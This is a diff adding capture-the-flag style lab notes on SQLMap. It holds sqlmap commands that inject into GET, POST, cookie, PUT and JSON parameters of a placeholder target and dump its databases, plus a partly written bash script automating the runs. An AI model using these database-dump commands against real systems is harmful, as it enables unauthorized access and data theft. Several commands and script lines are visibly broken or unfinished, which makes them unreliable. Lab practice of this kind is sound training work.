@@ -1,0 +1,141 @@
+#####Running SQLMap on an HTTP Request
+#
+### case 1
+#
+#	Traverse to target host. navigate to case 1. Copy target host URL. Run the command. Flag located.
+#
+#	Command: sqlmap 'http://[TARGET]/case1.php?id=1*' --batch --dump
+#
+### case 2 (question 1)
+#
+# Go to the target host and inspect network traffic. Navigate to case 2. Copy the first get request as a curl option. Change curl to sqlmap and append with "--batch" AND "--dump". Flag located
+#
+#	Command:
+#		sqlmap 'http://[TARGET]/case2.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://[TARGET]/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://[TARGET]' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'id=1*' --batch --dump
+#	
+### case 3 (question 2)
+#Go to target host and inspect traffic. Go to case 3.
+#	Command:
+#		sqlmap -u http://[TARGET]/case3.php --cookie='id=1*' --method PUT --batch --dump
+### case 4 (question 3)
+#
+#	Go to target host and inspect network traffic. Go to case 4. Copy post request request headers and copy into a text file. Copy post request value, as raw, contents in request tab.
+#
+#	File req.txt contents:
+#[
+#		POST /case4.php HTTP/1.1
+#		Host: [TARGET]
+#		User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+#		Accept: */*
+#		Accept-Language: en-US,en;q=0.5
+#		Accept-Encoding: gzip, deflate
+#		Referer: http://[TARGET]/case4.php
+#		Content-Type: application/json
+#		Content-Length: 8
+#		Origin: http://[TARGET]
+#		DNT: 1
+#		Connection: keep-alive
+#		Sec-GPC: 1
+#		Pragma: no-cache
+#		Cache-Control: no-cache
+#		{"id":1}
+#]
+#
+#	Command:
+#		sqlmap -r req.text --batch --dump
+#
+###case 5
+#
+###case 6
+#
+###case 7
+#
+###case 8
+#
+###case 9
+#
+###case 10
+#
+###case 11
+#
+#####Master output (bash) shell script:
+	#!/bin/bash
+
+	### Variables
+	#target host without protocol
+	TGTHOST=''
+
+	#shorthand
+	OUTLOG='/home/'$USER'/.local/share/sqlmapout/'
+	OUTFILE=$(date +%s)'.txt'
+	SQMIN='sqlmap --batch --dump -D testdb --random-agent -u '
+
+	#case 1
+	CS1=''
+	#case 2
+	CS2=''
+	#case 3
+	CS3=''
+	#case 4
+	CS4=''
+	#case 5
+	CS5=''
+	#case 6
+	CS6=''
+	#case 7
+	CS7=''
+	#case 8
+	CS8=''
+	#case 9
+	CS9=''
+	#case 10
+	CS10=''
+	#case 11
+	CS11=''
+
+	# Get target info from user
+	echo -n "Enter Target host: "
+	read TGTHOST
+	echo -e "Target host set to" $TGTHOST
+
+	# check if sqlmap is installed
+	echo -e "Checking if SQLmap is installed"
+
+	if [ $(dpkg-query -W -f='${Status}' sqlmap 2>/dev/null | grep -c "ok installed") -eq 0 ];
+	then
+	  echo -e "SQLmap not installed, installing now"
+	  apt-get install sqlmap -y;
+	fi
+
+	# check if paths exists
+	if [ -d "$OUTLOG" ]; then (echo 'path: '$OUTLOG' exists'); else (mkdir $OUTLOG && echo -e "making directory: " $OUTLOG); fi
+
+	CS1=$SQMIN'http://'$TGTHOST'/case1.php?id=1*' -T flag1
+	echo -e 'running case 1: ' $CS1
+	$CS1 >&1 > $OUTLOG$OUTFILE
+	cat $OUTLOG$OUTFILE | grep -i -E '(flag\d{1,2}\.csv)'
+	
+#	$CS2='http://'$TGTHOST'/case2.php' --compressed -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://$TGTHOST/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://$TGTHOST' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'id=1*' -T flag2
+#	echo -e 'running case 2: ' $CS2
+#	$CS2 >&1 > $OUTLOG$OUTFILE
+
+#	echo -e 'running case 3: ' $CS3
+
+#	echo -e 'running case 4: ' $CS4
+
+#	echo -e 'running case 5: ' $CS5
+
+#	echo -e 'running case 6: ' $CS6
+
+#	echo -e 'running case 7: ' $CS7
+
+#	echo -e 'running case 8: ' $CS8
+
+#	echo -e 'running case 9: ' $CS9
+
+#	echo -e 'running case 10: ' $CS10
+
+#	echo -e 'running case 11: ' $CS11
+
+	echo -e 'outputting all logs to: ' $OUTLOG$OUTFILE
+	echo -e 'all flags at: ' 
